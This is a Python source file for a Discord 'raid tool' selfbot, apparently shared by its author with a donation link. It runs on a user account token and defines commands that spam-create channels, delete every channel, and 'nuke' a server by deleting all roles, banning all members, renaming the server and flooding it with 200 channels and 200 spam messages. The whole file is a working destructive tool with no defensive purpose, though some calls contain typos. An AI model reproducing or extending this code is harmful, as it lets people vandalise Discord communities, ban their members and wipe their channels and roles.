import discord, pyautogui, json, asyncio, keyboard
from pyautogui import alert
from discord.ext import commands

with open("selfbot_config.json") as f:
    config = json.load(f)
    
count = 0


configDict = {
    'token': config.get("token"),
    'prefix':  config.get("prefix"),
    'sleep_delete':  config.get("sleep delete"),
    'bot_reaction':  config.get("bot reaction"),
    'stop bind': config.get("stop bind")
}

raidtool = commands.Bot(command_prefix=configDict['prefix'], description="Z3RO raid tool", self_bot=True)

@raidtool.event
async def on_ready():
    alert(text="Thank you for using Z3RO self bot!")
    print("Status code: 200")
    print("Bot Online - developer: \ndiscord: zemult \nyoutube: zemult")
    
@raidtool.command()
async def mcs(ctx, channelName : str=None, channelAmount : int=None):
    if channelName == None:
        try:
            await ctx.message.delete()
            embedVar = discord.Embed(title="Z3RO RAID TOOL", description="Channel Name Argument returns : null", color=0x992d22)
            embedVar.set_footer(text="Z3RO RAID TOOL was programmed by zemult, donate him at https://paypal.me/mekhibatchler1 :)")
            message = await ctx.send(embed=embedVar)
            await message.add_reaciton("✅")
            await asyncio.sleep(configDict['sleep_delete'])
            await message.delete()
        except:
            await ctx.message.delete()
            message = await ctx.send("**Z3RO RAID TOOL** \n**Channel Name Argument returns : null** \n**Reason: ** \n**You must give a channel name.**")
            await asyncio.sleep(configDict['sleep_delete'])
            await message.add_reaction("✅")
            await message.delete()
            
    elif channelAmount == None:
        try:
            await ctx.message.delete()
            embedVar = discord.Embed(title="Z3RO RAID TOOL", description="Channel Amount Argument returns : null", color=0x992d22)
            embedVar.set_footer(text="Z3RO RAID TOOL was programmed by zemult#0001, donate him at https://paypal.me/mekhibatchler1 :)")
            message = await ctx.send(embed=embedVar)
            await message.add_reaciton("✅")
            await asyncio.sleep(configDict['sleep_delete'])
            await message.delete()
        except:
            await ctx.message.delete()
            message = await ctx.message.send('**Z3RO RAID TOOL** \n**Channel Amount Argument returns : null** \n**Reason: ** \n**You must give a channel amount.**')
            await message.add_reaciton("✅")
            await asyncio.sleep(configDict['sleep_delete'])
    else:
        try:
            await ctx.message.delete()
            embedVar = discord.Embed(title="Z3RO RAID TOOL", description="Spamming channels in 3 seconds...", color=0x992d22)
            embedVar.set_footer(text="Z3RO RAID TOOL was programmed by zemult#0001, donate him at https://paypal.me/mekhibatchler1 :)")
            message = await ctx.send(embed=embedVar)
            await message.add_reaction("✅")
            await asyncio.sleep(configDict['sleep_delete'])
            await message.delete()
            for i in range(channelAmount):
                await ctx.guild.create_text_channel(channelName)
                if keyboard.is_pressed(configDict['stop bind']):
                    break
            
        except:
            await ctx.message.delete()
            message = await ctx.send('**Z3RO RAID TOOL** \n**Channel Amount Argument returns : null** \n**Reason: ** \n**You must give a channel amount.**')
            await message.add_reaction("✅")
            await asyncio.sleep(configDict['sleep_delete'])

@raidtool.command()
async def mscd(ctx):
    try:
        embed = discord.Embed(title="Z3RO RAID TOOL", description="Destroying all channels in 3 seconds...", color=0x992d22)
        message = await ctx.send(embed=embed)
        await message.add_reaction("✅")
        await asyncio.sleep(3)
        await message.delete()
        for i in list(ctx.guild.channels):
            await i.delete()
            print("Channel {} successfully deleted".format(i.id))
        
    except:
        await ctx.message.delete()
        message = await ctx.send("**Z3RO RAID TOOL", description="Destroying all channels in 3 seconds...")
        await message.add_reaction("✅")
        await asyncio.sleep(3)
        await message.delete()
        for i in list(ctx.guild.channels):
            await i.delete()
            print("Channel {} successfully deleted".format(i.id))


@raidtool.command()
async def allNuke(ctx, serverTitle : str=None):
    if serverTitle == None:
        try:
            await ctx.message.delete()
            embed = discord.Embed(title="Z3RO RAID TOOL", description="Server Title returned : null", color=0x992d22)
            embed.add_field(name="Reason", value="You must give a server title.")
            message = await ctx.send(embed=embed)
            await message.add_reaction("✅")
            await asyncio.sleep(3)
            await message.delete()
            
        except:
            await ctx.message.delete()
            message = await ctx.send(f"**Z3RO RAID TOOL** \n**Server Title returned : null** \n**Reason:** \n**You must give a server title**")
            await message.add_reaction("✅")
            await asyncio.sleep(3)
            await message.delete()
    else:
        try:
            await ctx.message.delete()
            embed = discord.Embed(title="Z3RO RAID TOOL", description="Nuking server in 3 seconds... Sorry to this server by the way... ¯\_(ツ)_/¯")
            message = await ctx.send(embed=embed)
            await asyncio.sleep(3)
            await message.delete()
            
            try:
                for x in list(ctx.guild.roles):
                    try:
                        await x.delete()
                        print("Role {} successfully deleted.".format(x.id))
                    except:
                        print("Role {} could not be deleted.".format(x.id))
            except:
                return None
            try:
                for _ in list(ctx.guild.users):
                    try:
                        await _.ban()
                        print("User {0} : {1} successfully banned.".format(_.id, _.display_name))
                    except:
                        print("User {0} : {1} could not be banned.".format(_.id, _.display_name))
            except:
                print("User {0} : {1} could not be banned.".format(_.id, _.display_name))

            try:
                await ctx.guild.edit(name=serverTitle)
                
            except:
                return None
            try:
                for i in range(int(200)):
                    try:
                        
                        await ctx.guild.create_text_channel("get nuked!!1!1!")
                    except:
                        return None
                for i in range(int(200)):
                    try:
                        await ctx.send("GET NUKED OMEGALUL !11!111!!!1")
                    except:
                        return None
                    
                    
            except:
                return None
            
            try:
                for y in list(ctx.guild.channels):
                    try:
                        await y.delete()
                        print("Channel {} successfully deleted".format(y.id))
                    except:
                        print("Channel {} could not be deleted.".format(y.id))
            except:
                return None
                
            
        except:
            await ctx.message.delete()
            message = await ctx.send("**Z3RO RAID TOOL** \n**Nuking server in 3 seconds...  Sorry to this server by the way... ¯\_(ツ)_/¯** ")
            await message.add_reaction("✅")
            await asyncio.sleep(3)
            await message.delete()
            
            try:
                for x in list(ctx.guild.roles):
                    try:
                        await x.delete()
                        print("Role {} successfully deleted.".format(x.id))
                    except:
                        print("Role {} could not be deleted.".format(x.id))
            except:
                return None
            try:
                for y in list(ctx.guild.channels):
                    try:
                        await y.delete()
                        print("Channel {} successfully deleted".format(y.id))
                    except:
                        print("Channel {} could not be deleted.".format(y.id))
            except:
                return None
                
            try:
                for _ in list(ctx.guild.users):
                    try:
                        await _.ban()
                        print("User {0} : {1} successfully banned.".format(_.id, _.display_name))
                    except:
                        print("User {0} : {1} could not be banned.".format(_.id, _.display_name))
            except:
                return None
            
            try:
                await ctx.guild.edit(name=serverTitle)
                
            except:
                return None
            try:
                for i in range(int(200)):
                    try:
                        
                        await ctx.guild.create_text_channel("get nuked!!1!1!")
                    except:
                        return None
                for i in range(int(200)):
                    try:
                        await ctx.send("GET NUKED OMEGALUL !11!111!!!1")
                    except:
                        return None
            except:
                return False
            
raidtool.run(configDict['token'], bot=False)
